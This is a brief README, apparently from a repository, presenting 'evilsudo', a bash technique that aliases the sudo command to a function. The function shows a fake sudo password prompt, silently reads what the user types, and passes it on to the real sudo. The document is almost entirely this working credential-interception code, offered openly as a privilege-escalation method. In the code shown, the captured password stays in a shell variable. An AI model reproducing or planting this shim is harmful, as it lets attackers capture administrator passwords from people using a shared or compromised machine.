# evilsudo
`evilsudo` is a privilege escalation technique based on alias'ing the sudo command

# code

```bash
alias sudo=evilsudo
function evilsudo() {
	if [ "$#" -gt "0" ]; then
		rights=$(echo "a" | /usr/bin/sudo -S whoami 2>/dev/null)
		if [ "$rights" == "root" ]; then
			$(which sudo) $@
		else
			original_params=$@
			echo -en "[sudo] password for $(whoami): "
			read -s password
			echo -en "\r"
			cmd=$(echo $password | $(which sudo) -S $original_params)
			echo -e ""
			echo "$cmd"
		fi
	else
		$(which sudo)
	fi
}
````
